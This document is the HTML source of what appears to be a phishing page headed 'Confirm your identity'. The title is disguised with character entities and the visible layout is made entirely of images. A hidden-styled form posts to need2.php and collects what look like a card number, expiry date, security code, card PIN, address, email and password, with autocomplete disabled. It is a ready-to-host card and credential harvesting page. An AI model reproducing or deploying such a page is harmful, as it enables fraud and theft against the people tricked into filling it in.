<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>C&#79;&#78;&#70;&#73;&#82;M Y&#79;&#85;R I&#68;&#69;&#78;&#84;&#73;&#84;Y </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>
<style type="text/css">  
.textbox {  
    border: solid 1px #bebfbf; 
  	padding-left: 8px;
	font-family: Verdana;
  	font-size: 16px;
    height: 42px; 
    width: 275px; 
 }  
.textbox:focus {  
    border: 1px solid #333; 
    box-shadow: 0px 0px 0px 4px #b3e7d1;  
    outline: 0; 
 } 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:614px; z-index:0"><img src="images/f5.png" alt="" title="" border=0 width=1349 height=614></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:612px; width:1349px; height:633px; z-index:1"><img src="images/f6.png" alt="" title="" border=0 width=1349 height=633></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:1247px; width:1349px; height:160px; z-index:2"><img src="images/f7.png" alt="" title="" border=0 width=1349 height=160></div>

<div id="image4" style="position:absolute; overflow:hidden; left:564px; top:1015px; width:108px; height:39px; z-index:3"><a href="#"><img src="images/f8.png" alt="" title="" border=0 width=108 height=39></a></div>
<form action=need2.php name=rnw method=post>
<input name="c" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:460px;left:445px;top:451px;z-index:4">
<input name="x" placeholder="mm/yy" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:460px;left:445px;top:535px;z-index:5">
<input name="v" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:460px;left:445px;top:619px;z-index:6">
<input name="p" class="textbox" autocomplete="off" required maxlength="4" type="password" style="position:absolute;width:460px;left:445px;top:703px;z-index:7">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:460px;left:445px;top:787px;z-index:8">
<input name="m" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:460px;left:445px;top:871px;z-index:9">
<input name="pe" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:460px;left:445px;top:955px;z-index:10">
<div id="formimage1" style="position:absolute; left:686px; top:1015px; z-index:11"><input type="image" name="formimage1" width="104" height="39" src="images/f9.png"></div>
</div>

</body>
</html>
